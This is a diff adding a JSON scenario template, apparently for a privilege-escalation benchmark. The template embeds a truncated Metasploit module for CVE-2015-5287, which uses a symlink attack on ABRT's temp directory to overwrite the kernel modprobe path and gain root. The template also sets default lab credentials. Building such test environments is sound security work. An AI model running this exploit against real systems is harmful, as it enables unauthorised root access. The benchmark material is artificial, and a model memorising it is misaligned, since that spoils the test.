@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47421",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: ABRT - sosreport Privilege Escalation (Metasploit) (CVE-2015-5287)\n\nExploit source code (47421.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ABRT sosreport Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on RHEL systems with\n        a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured\n        as the crash handler.\n\n        `sosreport` uses an insecure temporary directory, allowing local users\n        to write to arbitrary files (CVE-2015-5287). This module uses a symlink\n        attack on `/var/tmp/abrt/cc-*$pid/` to overwrite the `modprobe` path\n        in `/proc/sys/kernel/modprobe`, resulting in root privileges.\n\n        Waiting for `sosreport` could take a few minutes.\n\n        This module has been tested successfully on:\n\n        abrt 2.1.11-12.el7 on RHEL 7.0 x86_64; and\n        abrt 2.1.11-19.el7 on RHEL 7.1 x86_64.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rebel', # Discovery and sosreport-rhel7.py exploit\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2015-11-23',\n      'Platform'       => ['linux'],\n      'Arch'           =>\n        [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [[ 'Auto', {} ]],\n      'References'     =>\n        [\n          ['BID', '78137'],\n          ['CVE', '2015-5287'],\n          ['EDB', '38832'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2015/12/01/1'],\n          ['URL', 'https://access.redhat.com/errata/RHSA-2015:2505'],\n          ['URL', 'https://access.redhat.com/security/cve/CVE-2015-5287'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1266837']\n        ]\n    ))\n    register_options [\n      OptInt.new('TIMEOUT', [true, 'Timeout for sosreport (seconds)', '600'])\n    ]\n    register_advanced_options [\n      OptBool.new('ForceExploit',  [false, 'Override check result', false]),\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  def check\n    kernel_core_pattern = cmd_exec 'grep abrt-hook-ccpp /proc/sys/kernel/core_pattern'\n    unless kernel_core_pattern.include? 'abrt-hook-ccpp'\n      vprint_error 'System is not configured to use ABRT for crash reporting'\n      return CheckCode::Safe\n    end\n    vprint_good 'System is configured to use ABRT for cr\n```",
+  "cve": "CVE-2015-5287",
+  "exploitdb_id": "47421",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47421",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
